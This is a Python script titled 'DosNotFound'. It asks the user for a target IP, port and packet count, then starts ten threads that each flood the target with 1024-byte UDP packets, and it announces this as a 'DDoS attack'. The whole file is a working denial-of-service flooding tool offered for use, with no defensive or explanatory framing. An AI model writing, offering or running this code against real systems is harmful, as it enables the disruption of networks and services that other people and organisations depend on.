#!/usr/bin/python
import os
import socket
import threading

class color:
    red = '\033[31m'
    green = '\033[32m'
    blue = '\033[36m'
    pink = '\033[35m'
    orange = '\033[34m'
    white = '\033[00m'
    reset = '\033[0m'

#Banner part( if u want to change u can but dont forget permission)
def banner():
    os.system('clear')
    print(f"{color.green}Welcome to DosNotFound{color.reset}")
    print(f"{color.green}============================{color.reset}")

def flood(target_ip, target_port, packet_count):
    bytes = b"X" * 1024  
    for _ in range(packet_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(bytes, (target_ip, target_port))
            print(f"{color.green}[+] Sent packet to {target_ip}:{target_port}{color.reset}")
        except:
            print(f"{color.red}[-] Failed to send packet to {target_ip}:{target_port}{color.reset}")

def start_attack():
    target_ip = input(f"{color.white}[+] Enter Target IP: {color.reset}")
    target_port = int(input(f"{color.white}[+] Enter Target Port: {color.reset}"))
    packet_count = int(input(f"{color.white}[+] Enter Number of Packets to Send: {color.reset}"))

    print(f"{color.green}[+] Starting DDoS attack on {target_ip}:{target_port} with {packet_count} packets...{color.reset}")

    for _ in range(10):  # 10 thread
        thread = threading.Thread(target=flood, args=(target_ip, target_port, packet_count))
        thread.start()

if __name__ == "__main__":
    banner()
    start_attack()
